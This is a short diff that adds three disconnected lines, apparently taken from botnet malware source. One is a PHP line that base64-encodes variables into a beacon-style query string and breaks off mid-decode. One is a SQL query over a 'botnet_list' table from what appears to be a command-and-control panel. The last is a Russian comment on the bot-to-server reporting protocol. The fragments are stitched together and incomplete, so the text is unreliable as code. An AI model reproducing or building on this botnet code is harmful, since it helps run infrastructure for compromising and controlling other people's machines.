@@ -1,0 +1,3 @@
+;$z="/?".base64_encode($a).".".base64_encode($b).".".base64_encode($c).".".base64_encode($d).".".base64_encode($e).".".base64_encode($f).".".base64_encode($g).".".base64_encode($h).".e.".base64_encode($i).".".base64_encode($j);$f=base64_decode("
+if(!($r = mysqlQueryEx('botnet_list', 'SELECT *, IF(`rtime_last`>='.ONLINE_TIME_MIN.', 1, 0) AS `is_online`, LOCATE(`ipv4`, `ipv4_list`) as `nat_status` FROM `botnet_list` WHERE '.$sqlBlist)))ThemeMySQLError();
+Протокол бот <-> сервер представляет из себя со стороны бота - отсылка отчета о чем либо
